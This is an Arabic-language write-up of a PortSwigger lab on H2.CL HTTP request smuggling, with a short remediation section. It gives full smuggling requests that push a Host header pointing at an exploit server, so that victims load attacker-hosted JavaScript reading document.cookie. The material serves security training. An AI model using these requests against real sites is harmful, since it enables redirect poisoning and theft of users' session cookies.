# [H2.CL request smuggling](https://portswigger.net/web-security/request-smuggling/advanced/lab-request-smuggling-h2-cl-request-smuggling)

## **`الهدف`**
قم بتنفيذ هجوم تهريب طلبات يتسبب في قيام متصف الضحية بتحميل ملف `JavaScript` خبيث من سيرفر الاستغلال وتنفيذه والذي يستدعي `alert(document.cookie)`.
## **`خطوات الحل`**
سنقوم بتحويل طلب الدخول إلى اللاب إلى `Repeater`
```http
GET / HTTP/2
Host: 0ab4003404c497e28019e43b00260046.web-security-academy.net
Cookie: session=UYrTzLgTR4Wci6rtpNEJCQfkJQLOXgaB
```

ثم سنقوم بالتالي:
1. تعديل الـ `Method` عن طريق الضغط على الـ `Mouse right-click` ونضغط `Change request method` ليصبح `POST`.
2. تعديل إعدادات الـ `Repeater` ونقوم بإلغاء إختيار `Update Content-Length`.
3. يجب جعل قيمة ترويسة `Content-Length` في الطلب الأصلي تساوي صفر.
4. يجب جعل ترويسة `Content-Length` الأخيرة التي ستكون في الطلب الثاني، أكبر قليلًا من العدد الفعلي للبايتس في الطلب الثاني ليبقى معلقًا ويتدمج دمجه مع الطلب التالي.
5. تعديل جسم الطلب ليناسب هجوم `H2.CL`

ليصبح شكل الطلب فى النهاية كالتالي:
```http
POST / HTTP/2
Host: 0ab4003404c497e28019e43b00260046.web-security-academy.net
Cookie: session=UYrTzLgTR4Wci6rtpNEJCQfkJQLOXgaB
Cache-Control: max-age=0
Content-Length: 0

TEST
```
وسنقوم بإرساله أول مرة وستكون الاستجابة طبيعية ولكن بمجرد إرساله مرة أخرى سنجد أن الاستجابة هي `404 Not Found`، وهذا يعنى أن الطلب تم تهريبه بنجاح والثغرة موجودة
```http
HTTP/2 404 Not Found
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 11

"Not Found"
```

بعد ذلك إذا جربنا إرسال طلب إلى `GET /resources`
```http
GET /resources HTTP/2
Host: 0ab4003404c497e28019e43b00260046.web-security-academy.net
Cookie: session=UYrTzLgTR4Wci6rtpNEJCQfkJQLOXgaB
```
سنجد أن الاستجابة تقوم بعمل إعادة توجيه إلى `/resources/`
```http
HTTP/2 302 Found
Location: https://0ab4003404c497e28019e43b00260046.web-security-academy.net/resources/
X-Frame-Options: SAMEORIGIN
Content-Length: 0
```

لذلك سنقوم بالدخول إلى سيرفر الاستغلال الموجود في اللاب، ونقوم بتعديل حقل `File` إلى `/resources` ونقوم بحقن `alert(document.cookie)` في حقل `Body` ونضغط `Store`

بعد ذلك سنقوم بتعديل الطلب الذي يحتوي على الطلب المُهرب ونضع رابط سيرفر الاستغلال في ترويسة `Host` في الطلب المُهرب ليصبح كالتالي:
```http
POST / HTTP/2
Host: 0ab4003404c497e28019e43b00260046.web-security-academy.net
Cookie: session=UYrTzLgTR4Wci6rtpNEJCQfkJQLOXgaB
Content-Length: 0

GET /resources HTTP/1.1
Host: exploit-0aa2009304f1979c8078e36601320023.exploit-server.net
Content-Length: 05

TEST
```

وسنقوم بإرساله أول مرة وستكون الاستجابة طبيعية ولكن بمجرد إرساله مرة أخرى سنجد أن الاستجابة هي `302 Found` كما أنه تم عمل إعادة توجيه إلى سيرفر الاستغلال الخاص بنا وهذا يعنى أن السيرفر الخلفي يعتمد على قيمة ترويسة `Host` في إعادة التوجيه.

وسنحتاج إلى تكرار هذا عدة مرات حتى يتصادف مع لحظة دخول الضحية إلى الموقع ليتم تحميل الملف الخبيث لننتهي من حل اللاب.

## **`ترقيع الثغرة`**
**`نفس ترقيع لاب` [Response queue poisoning via H2.TE request smuggling](./Response-queue-poisoning-via-H2.TE-request-smuggling.md)

وبما أن الثغرة في السيرفر الخلفي فقط والذي لا يمكن التحكم في طلباته إلا عن طريق ثغرة `HRS` فإن ترقيع هذه الثغرة كافي لأن محاولة تعديل ترويسات `Host` في الطلبات الأصلية لا ينجح في التأثير على إعادة التوجيه ولكن لزيادة الأمان يمكن ضبط السيرفر الخلفي لاستخدام مسارات نسبية `Relative Paths`في إعادة التوجيه، وإذا كان لابد من استخدام مسار كامل `Absolute URL` فيجب التحقق من قيمة `Host` ومطابقتها مع قائمة بيضاء `Whitelist` مسموح بها.
